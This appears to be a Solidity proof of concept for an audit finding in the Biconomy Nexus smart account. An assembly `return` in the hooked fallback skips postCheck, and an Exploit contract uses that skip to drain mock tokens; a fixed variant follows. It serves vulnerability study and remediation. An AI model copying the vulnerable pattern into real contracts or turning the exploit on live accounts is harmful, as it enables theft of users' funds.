// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Biconomy Nexus — Spearbit, October 2024
    fallback() is wrapped in withHook, but a successful module call ends in
    assembly `return`. That exits the call before postCheck, so a hook that
    would revert a balance drop never runs and the module keeps the tokens.
*/

contract Token {
    string public symbol = "NXT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IHook {
    function preCheck(address sender, uint256 value, bytes calldata data) external returns (bytes memory);
    function postCheck(bytes calldata hookData) external;
}

contract Hook {
    Token public token;
    uint256 public snap;
    bool public preRan;
    bool public postRan;

    constructor(Token token_) {
        token = token_;
    }

    function preCheck(address, uint256, bytes calldata) external returns (bytes memory) {
        snap = token.balanceOf(msg.sender);
        preRan = true;
        return "";
    }

    function postCheck(bytes calldata) external {
        postRan = true;
        require(token.balanceOf(msg.sender) >= snap, "post");
    }
}

contract Handler {
    Token public token;
    address public thief;

    constructor(Token token_, address thief_) {
        token = token_;
        thief = thief_;
    }

    fallback() external payable {
        require(token.transferFrom(msg.sender, thief, 100 ether), "drain");
    }
}

contract NexusAccount {
    address public hook;
    address public handler;

    constructor(address hook_, address handler_, Token token) {
        hook = hook_;
        handler = handler_;
        token.approve(handler_, 100 ether);
    }

    modifier withHook() {
        address hook_ = hook;
        if (hook_ == address(0)) {
            _;
        } else {
            bytes memory hookData = IHook(hook_).preCheck(msg.sender, msg.value, msg.data);
            _;
            IHook(hook_).postCheck(hookData);
        }
    }

    fallback() external payable withHook {
        address handler_ = handler;
        if (handler_ != address(0)) {
            assembly {
                calldatacopy(0, 0, calldatasize())
                mstore(calldatasize(), shl(96, caller()))
                if iszero(call(gas(), handler_, callvalue(), 0, add(calldatasize(), 20), 0, 0)) {
                    returndatacopy(0, 0, returndatasize())
                    revert(0, returndatasize())
                }
            }
            // @> VULN: assembly return ends the call, so withHook's postCheck never runs
            assembly {
                return(0, returndatasize())
            }
        }
    }
}

contract NexusAccountFixed {
    address public hook;
    address public handler;

    constructor(address hook_, address handler_, Token token) {
        hook = hook_;
        handler = handler_;
        token.approve(handler_, 100 ether);
    }

    function pre(bytes calldata data) internal returns (bytes memory hookData) {
        if (hook != address(0)) hookData = IHook(hook).preCheck(msg.sender, msg.value, data);
    }

    function post(bytes memory hookData) internal {
        if (hook != address(0)) IHook(hook).postCheck(hookData);
    }

    fallback() external payable {
        bytes memory hookData = pre(msg.data);
        address handler_ = handler;
        bytes memory out;
        bool ok;
        assembly {
            calldatacopy(0, 0, calldatasize())
            mstore(calldatasize(), shl(96, caller()))
            ok := call(gas(), handler_, callvalue(), 0, add(calldatasize(), 20), 0, 0)
            let n := returndatasize()
            out := mload(0x40)
            mstore(out, n)
            returndatacopy(add(out, 0x20), 0, n)
            mstore(0x40, add(add(out, 0x20), n))
        }
        require(ok, "call");
        post(hookData);
        assembly {
            return(add(out, 0x20), mload(out))
        }
    }
}

contract Exploit {
    Token public token;
    Hook public hook;
    Handler public handler;
    NexusAccount public account;
    uint256 public stolen;

    constructor() {
        token = new Token();
        hook = new Hook(token);
        handler = new Handler(token, address(this));
        account = new NexusAccount(address(hook), address(handler), token);
        token.mint(address(account), 100 ether);
    }

    function run() external {
        (bool ok,) = address(account).call("");
        require(ok, "fallback");
        stolen = token.balanceOf(address(this));
        require(hook.preRan(), "pre");
        require(!hook.postRan(), "post skipped");
        require(stolen == 100 ether, "stolen");
        require(token.balanceOf(address(account)) == 0, "account");
    }
}
